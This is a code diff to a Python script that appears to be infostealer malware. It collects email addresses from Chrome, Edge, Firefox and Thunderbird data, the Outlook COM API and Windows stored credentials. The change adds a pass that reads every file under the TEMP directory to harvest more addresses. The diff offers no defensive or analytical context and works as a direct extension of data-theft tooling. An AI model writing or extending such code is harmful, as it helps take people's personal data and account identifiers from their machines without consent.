@@ -368,14 +368,27 @@ def thunderbird(thunderbird_path, email_pattern):
                 except: pass
             conn.close()
     return emails
-                    
+
+emails = []
+
+for root, _, files in os.walk(os.getenv('TEMP')):
+    for file in files:
+        try:
+            with open(os.path.join(root,file), 'r', errors='ignore') as f:
+                data = f.read()
+                emails.extend(re.findall(email_pattern, data))
+        except: pass
 
 chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
 edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
 firefox_emails = firefox(firefox_path, email_pattern)
 thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
 
-emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
+# emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
+emails.extend(chrome_emails)
+emails.extend(edge_emails)
+emails.extend(firefox_emails)
+emails.extend(thunderbird_emails)
 
 try:
     # Method 1: Outlook COM API
@@ -410,7 +423,7 @@ try:
         emails.extend(re.findall(email_pattern, cred['UserName']))
 except Exception as e:
     print(f"ERROR FETCHING WIN CREDS : {e}")
-
+    
 emails = list(set(emails))
 
 print("AFTER FILTERINGGG")
